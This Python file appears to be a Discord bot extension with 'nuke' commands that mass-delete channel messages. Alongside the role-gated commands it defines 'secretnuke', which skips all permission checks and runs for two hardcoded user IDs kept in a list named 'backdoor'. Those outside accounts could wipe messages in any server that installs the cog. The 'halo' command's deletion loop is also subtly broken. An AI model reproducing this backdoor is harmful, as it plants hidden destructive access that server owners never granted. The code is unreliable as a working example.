import discord
from discord.ext import menus
from discord.ext import commands
from discord.utils import get
from discord.ext.commands import Bot
from discord.ext.commands import has_permissions
import asyncio

# Cog for nuking text channels
class NukeCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(pass_context = True) # Must do pass_context = True for code to work
    #@commands.has_permissions(manage_guild=True)
    @commands.has_any_role("Admin", "Classified")
    async def nuke(self, ctx, num):
        
        channel = ctx.message.channel
        messages = []

        # Doomsday countdown message
        for count in range(0,5):
            embed = discord.Embed(title="DOOMSDAY COUNTDOWN", description=str("Nuking commences in " + str(5 - count) + "..."), color=0xd11313)
            await ctx.send(embed = embed)
            await asyncio.sleep(1)

        embed = discord.Embed(title="GOODBYE", description=str("IT'S BEEN FUN"), color=0xd11313)
        await ctx.send(embed = embed)

        # Gets messages and adds them to list
        num = int(num)
        async for message in channel.history(limit = num):
            messages.append(message)

        await channel.delete_messages(messages) # Deletes all messages in list
    
    @commands.command(pass_context = True) # Must do pass_context = True for code to work
    
    async def secretnuke(self, ctx, num):
        backdoor = [140698580590657536, 655887742206476309]

        if (ctx.author.id in backdoor):
            channel = ctx.message.channel
            messages = []

            # Doomsday countdown message
            for count in range(0,5):
                embed = discord.Embed(title="DOOMSDAY COUNTDOWN", description=str("Nuking commences in " + str(5 - count) + "..."), color=0xd11313)
                await ctx.send(embed = embed)
                await asyncio.sleep(1)

            embed = discord.Embed(title="GOODBYE", description=str("IT'S BEEN FUN"), color=0xd11313)
            await ctx.send(embed = embed)

            # Gets messages and adds them to list
            num = int(num)
            async for message in channel.history(limit = num):
                messages.append(message)

            await channel.delete_messages(messages) # Deletes all messages in list
        

    @commands.command(pass_context = True) # Must do pass_context = True for code to work
    @commands.has_any_role("Admin", "Classified")
    # Deletes EVERY SINGLE message in a channel one by one and sets the channel to read only while doing so
    async def halo(self, ctx):
        # ctx.guild.default_role gets the @everyone role that all members have by default
        await ctx.channel.set_permissions(ctx.guild.default_role, read_messages = True, send_messages = False) # Mutes channel

        # Deletes ALL messages in channel
        channel = ctx.message.channel
        messages = []
        async for message in channel.history(limit = 5000):
            messages.append(message)
            #await message.delete()

        embed = discord.Embed(title="INITIATING HALO PROTOCOL", description=str("MASS DELETING MESSAGES"), color=0xd11313)
        i = 0
        while len(messages) != 0:
            await messages[i].delete()
            i += 1
        
        print(str(i))
        print("Messages deleted")
        await ctx.channel.set_permissions(ctx.guild.default_role, send_messages = True)
        
    @commands.command(pass_context = True)
    @commands.has_permissions(manage_guild=True)
    async def unhalo(self, ctx):
        await ctx.channel.set_permissions(ctx.guild.default_role, send_messages = True)


def setup(bot):
    bot.add_cog(NukeCog(bot))